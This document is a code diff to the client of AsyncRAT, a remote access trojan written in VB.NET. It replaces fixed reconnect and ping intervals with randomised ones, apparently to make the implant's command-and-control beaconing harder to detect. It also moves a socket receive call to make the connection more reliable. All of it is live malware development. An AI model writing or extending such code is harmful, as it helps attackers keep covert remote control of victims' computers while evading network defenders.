@@ -88,7 +88,7 @@ Namespace AsyncRAT
 
 
             While True
-                Thread.Sleep(2.5 * 1000)
+                Thread.Sleep(New Random().Next(1000, 6 * 1000))
                 If isConnected = False Then
                     isDisconnected()
                     Connect()
@@ -148,7 +148,7 @@ Namespace AsyncRAT
                 S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
 
                 Dim T As New TimerCallback(AddressOf Ping)
-                Tick = New Threading.Timer(T, Nothing, 15000, 30000)
+                Tick = New Threading.Timer(T, Nothing, New Random().Next(30 * 1000, 60 * 1000), New Random().Next(30 * 1000, 60 * 1000))
             Catch ex As Exception
                 Debug.WriteLine("Connect : Failed")
                 isConnected = False
@@ -204,12 +204,12 @@ Namespace AsyncRAT
                             Debug.WriteLine("BeginReceive : Received Full Packet : NotEqual")
                         End If
                     End If
+                    S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
                 Else
                     Debug.WriteLine("BeginReceive : Disconnected")
                     isConnected = False
                     Exit Sub
                 End If
-                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
             Catch ex As Exception
                 Debug.WriteLine("BeginReceive : Failed")
                 isConnected = False
